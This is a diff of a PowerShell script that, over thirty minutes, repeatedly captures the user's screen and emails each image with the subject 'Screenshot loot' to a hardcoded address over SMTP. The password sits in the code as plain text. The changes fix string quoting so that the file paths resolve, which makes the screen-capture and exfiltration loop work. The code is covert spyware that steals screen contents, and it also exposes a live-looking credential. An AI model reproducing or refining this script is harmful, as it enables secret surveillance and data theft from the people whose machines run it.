@@ -1,4 +1,4 @@
-﻿New-Item -Path '$home\Documents\Screens\' -ItemType Directory
+New-Item -Path "$home\Documents\Screens\" -ItemType Directory
 $timer = new-timespan -Minutes 30
 $clock = [diagnostics.stopwatch]::StartNew() 
 while ($clock.elapsed -lt $timer){ 
@@ -13,7 +13,7 @@ $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size) 
 $enddate = (Get-Date).tostring('ddMMyy-hh_mm_ss') 
 $filename = $enddate + '.gif' 
-$bitmap.Save('$home\Documents\Screens\' + $filename) 
+$bitmap.Save("$home\Documents\Screens\" + $filename) 
 start-sleep -seconds 10
 Send-MailMessage -From daggerdark13@gmail.com -To daggerdark13@gmail.com -Subject "Screenshot loot" -Body "Please find attached your screenshot update" -Attachment "$home\Documents\Screens\$filename" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList daggerdark13@gmail.com, (ConvertTo-SecureString -String "Daggerdark@14" -AsPlainText -Force))
 start-sleep -seconds 60 
